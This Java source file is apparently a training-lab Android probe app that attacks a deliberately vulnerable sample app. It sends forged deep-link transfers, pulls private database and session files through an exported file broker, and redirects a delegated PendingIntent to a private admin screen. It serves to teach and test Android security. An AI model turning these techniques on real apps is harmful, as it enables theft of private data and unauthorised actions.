package com.example.labprobe;

import android.app.Activity;
import android.app.ActivityOptions;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.example.labui.LabUi;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

/** An ordinary application UID: no root, storage permission, or accessibility service. */
public final class MainActivity extends Activity {
    private static final int FILE=201,TICKET=202;
    private String target="com.example.vulnerable";
    private String requestTarget;
    private PendingIntent ticket;
    private String ticketTarget;
    private TextView output;
    private LinearLayout root;
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b); if(b!=null) target=b.getString("target",target);
        render();
    }
    @Override protected void onSaveInstanceState(Bundle b) { super.onSaveInstanceState(b); b.putString("target",target); }
    private ComponentName component(String pkg,String cls) { return new ComponentName(pkg,"com.example.surfacelab."+cls); }
    private void render() {
        root=LabUi.page(this,"SURFACELAB / COMPANION PROBE","Test the boundary.","A separate app with its own UID. Every action targets the selected training package.");
        LinearLayout c=LabUi.card(this,root,"TARGET APPLICATION",target.endsWith("vulnerable")?"Vulnerable build":"Hardened build","Package: "+target+"\nProbe UID: "+android.os.Process.myUid());
        LabUi.button(this,c,"Switch target",()->{target=target.endsWith("vulnerable")?"com.example.hardened":"com.example.vulnerable";ticket=null;render();});
        c=LabUi.card(this,root,"01 / DEEP LINK","Send a demo transfer","Request 42 synthetic credits through an external link.");
        LabUi.button(this,c,"Send transfer link",()->{
            String scheme=target.endsWith("vulnerable")?"myapp":"safelab";
            launch(new Intent(Intent.ACTION_VIEW,Uri.parse(scheme+"://transfer?to=Probe&amount=42")).setPackage(target));
        });
        c=LabUi.card(this,root,"02 / FILEPROVIDER","Request a private file","The provider is not exported. The exported broker is the vulnerable boundary.");
        LabUi.button(this,c,"Request private session",()->requestFile(null));
        LabUi.button(this,c,"Request ledger database",()->requestFile("/data/user/0/"+target+"/databases/ledger.db"));
        LabUi.button(this,c,"Request public handout",()->requestFile("/data/user/0/"+target+"/cache/published/public-guide.txt"));
        c=LabUi.card(this,root,"04 / PENDINGINTENT","Redirect a delegated ticket","First prove that a direct admin launch is denied, then send a modified ticket.");
        LabUi.button(this,c,"Try direct admin launch",()->launch(new Intent().setComponent(component(target,"AdminActivity"))));
        LabUi.button(this,c,"Request ticket",()->requestTicket());
        LabUi.button(this,c,"Send modified ticket",this::sendTicket);
        LinearLayout log=LabUi.card(this,root,"PROBE OUTPUT","Observation log","Granted file copies and the latest result are saved in this probe's own internal files directory.");
        output=LabUi.code(this,log,"Ready. Select a test above.");
    }
    private void report(String status,String detail) {
        output.setText(status+"\n\n"+detail);
        try {
            JSONObject j=new JSONObject().put("target",requestTarget==null?target:requestTarget).put("status",status).put("detail",detail);
            Files.write(new java.io.File(getFilesDir(),"last-result.json").toPath(),j.toString(2).getBytes(StandardCharsets.UTF_8));
        } catch(Exception e) { output.append("\nCould not save observation: "+e.getMessage()); }
        root.post(()->((android.widget.ScrollView)root.getParent()).smoothScrollTo(0,root.getBottom()));
    }
    private void launch(Intent intent) {
        requestTarget=target;
        try { startActivity(intent); } catch(Exception e) { report("BLOCKED",e.getClass().getSimpleName()+": "+e.getMessage()); }
    }
    private void requestFile(String path) {
        requestTarget=target;
        Intent i=new Intent().setComponent(component(target,"ShareActivity")); if(path!=null)i.putExtra("path",path);
        try {startActivityForResult(i,FILE);} catch(Exception e){report("ERROR",e.toString());}
    }
    private void requestTicket() {
        requestTarget=target; ticket=null;
        try {startActivityForResult(new Intent().setComponent(component(target,"TicketActivity")),TICKET);}catch(Exception e){report("ERROR",e.toString());}
    }
    private void sendTicket() {
        if(ticket==null){report("NO TICKET","Request a ticket from the selected target first.");return;}
        try {
            Intent fill=new Intent().setComponent(component(ticketTarget,"AdminActivity")).setAction("com.example.surfacelab.EXPORT_AUDIT");
            Bundle options=null;
            if(Build.VERSION.SDK_INT>=34) {
                ActivityOptions o=ActivityOptions.makeBasic();
                o.setPendingIntentBackgroundActivityStartMode(ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED); options=o.toBundle();
            }
            ticket.send(this,0,fill,null,null,null,options);
            report("TICKET SENT","Supplied AdminActivity as the fill-in component. Inspect the target screen to see whether it was accepted.");
        } catch(Exception e){report("ERROR",e.toString());}
    }
    @Override protected void onActivityResult(int req,int code,Intent data) {
        super.onActivityResult(req,code,data);
        if(code!=RESULT_OK || data==null){report("BLOCKED",data==null?"No result returned":String.valueOf(data.getStringExtra("error")));return;}
        if(req==FILE) {
            Uri uri=data.getData();
            try(InputStream in=getContentResolver().openInputStream(uri);ByteArrayOutputStream out=new ByteArrayOutputStream()) {
                if(in==null) throw new java.io.IOException("No input stream");
                byte[] buf=new byte[4096];int n;while((n=in.read(buf))!=-1)out.write(buf,0,n);
                byte[] bytes=out.toByteArray(); String name="capture-"+requestTarget+".bin";
                Files.write(new java.io.File(getFilesDir(),name).toPath(),bytes);
                String text=bytes.length>512?"Binary file, "+bytes.length+" bytes":new String(bytes,StandardCharsets.UTF_8);
                report("FILE READ",uri+"\n\n"+text+"\n\nSaved: "+name);
            }catch(Exception e){report("ERROR",e.toString());}
        } else if(req==TICKET) {
            ticket=data.getParcelableExtra("ticket");ticketTarget=requestTarget;
            report("TICKET RECEIVED","Creator: "+(ticket==null?"missing":ticket.getCreatorPackage())+"\nTap Send modified ticket to supply the private admin destination.");
        }
    }
}
